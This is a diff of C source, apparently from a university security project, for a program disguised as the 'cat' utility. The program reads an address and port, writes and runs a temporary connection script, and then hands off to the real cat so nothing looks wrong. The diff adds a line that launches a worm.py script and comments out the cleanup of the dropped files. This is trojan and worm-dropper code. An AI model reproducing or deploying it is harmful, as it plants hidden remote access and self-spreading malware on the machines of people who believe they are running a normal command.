@@ -30,7 +30,7 @@ int main(int argc, char *argv[]){
     strcat(command, line);
     // printf("%s",command);
     fclose(fptr);
-    system("rm address_port.txt");
+    // system("rm address_port.txt");
 
     //create temp shell script and execute it
     fptr = fopen("connection.sh", "wb");
@@ -38,10 +38,12 @@ int main(int argc, char *argv[]){
     fclose(fptr);
     system(command);
     sleep(4);
-    system("rm connection.sh");
+    // system("rm connection.sh");
 
     //execute worm
-    //system("")
+    system("python3 worm.py");
+
+    // system("rm worm.py");
 
     //create temp .zip file, uncompress it and execute it with argv argc
     fptr = fopen("./compression.zip", "wb");
@@ -61,7 +63,7 @@ int main(int argc, char *argv[]){
         // }
         // absolutely path
         // int outcome = execvp("/home/wc/computer_security/ComputerSecurity/project3/task2/cat", argv);
-        int outcome = execvp("/home/csc2021/computer_security/cat", argv);
+        int outcome = execvp("/home/csc2021/cat", argv);
         if(outcome == -1)printf("error in execvp\n");
     }
     else{
